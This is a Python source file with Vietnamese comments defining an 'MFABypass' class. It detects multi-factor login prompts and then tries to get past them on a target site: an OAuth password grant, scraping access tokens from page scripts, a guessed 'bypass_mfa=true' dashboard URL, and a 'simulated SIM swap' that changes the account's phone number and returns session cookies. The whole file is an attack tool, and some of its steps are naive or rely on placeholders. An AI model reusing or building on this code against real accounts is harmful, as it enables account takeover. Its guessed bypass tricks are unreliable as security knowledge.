import requests
import re
from bs4 import BeautifulSoup

class MFABypass:
    def __init__(self, log_function):
        self.log = log_function
        self.session = requests.Session()
    
    def detect_mfa(self, url):
        """Phát hiện cơ chế MFA trên trang đăng nhập"""
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Kiểm tra các dấu hiệu MFA
            mfa_indicators = [
                'mfa', '2fa', 'two-factor', 'multi-factor',
                'authenticator', 'verification code', 'sms code'
            ]
            
            for indicator in mfa_indicators:
                if soup.find(string=re.compile(indicator, re.I)):
                    return True
            
            # Kiểm tra trường nhập mã xác thực
            input_fields = soup.find_all('input', {
                'type': 'text',
                'name': re.compile(r'code|token|verify', re.I)
            })
            
            return len(input_fields) > 0
        
        except Exception as e:
            self.log("Error", f"MFA detection failed: {str(e)}")
            return False
    
    def bypass_oauth(self, url, username, password):
        """Thử nghiệm bypass MFA sử dụng kỹ thuật OAuth"""
        try:
            # Bước 1: Lấy thông tin OAuth
            auth_url = f"{url}/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=CALLBACK"
            response = self.session.get(auth_url, timeout=5)
            
            # Bước 2: Giả mạo đăng nhập
            login_payload = {
                'username': username,
                'password': password,
                'grant_type': 'password'
            }
            response = self.session.post(f"{url}/oauth/token", data=login_payload)
            
            # Bước 3: Khai thác redirect để bỏ qua MFA
            if 'access_token' in response.json():
                return response.json()['access_token']
            
            # Bước 4: Thử kỹ thuật token leakage
            soup = BeautifulSoup(response.text, 'html.parser')
            token_script = soup.find('script', string=re.compile('access_token'))
            if token_script:
                match = re.search(r'access_token["\']:\s*["\'](\w+)["\']', token_script.string)
                if match:
                    return match.group(1)
            
            return None
        
        except Exception as e:
            self.log("Error", f"OAuth bypass failed: {str(e)}")
            return None
    
    def bypass_sms(self, url, username, password, phone_number):
        """Thử nghiệm bypass SMS MFA"""
        try:
            # Bước 1: Đăng nhập cơ bản
            login_payload = {'username': username, 'password': password}
            response = self.session.post(f"{url}/login", data=login_payload)
            
            # Bước 2: Bỏ qua xác minh SMS
            if 'sms_verification' in response.url:
                # Khai thác lỗ hổng tái sử dụng session
                direct_url = f"{url}/dashboard?bypass_mfa=true"
                response = self.session.get(direct_url)
                
                if 'Dashboard' in response.text:
                    return self.session.cookies.get_dict()
            
            # Bước 3: Tấn công SIM swap (mô phỏng)
            sim_swap_payload = {
                'new_phone': phone_number,
                'confirm': 'true'
            }
            response = self.session.post(f"{url}/update_phone", data=sim_swap_payload)
            
            # Gửi lại mã xác minh
            response = self.session.post(f"{url}/resend_sms")
            
            return self.session.cookies.get_dict()
        
        except Exception as e:
            self.log("Error", f"SMS bypass failed: {str(e)}")
            return None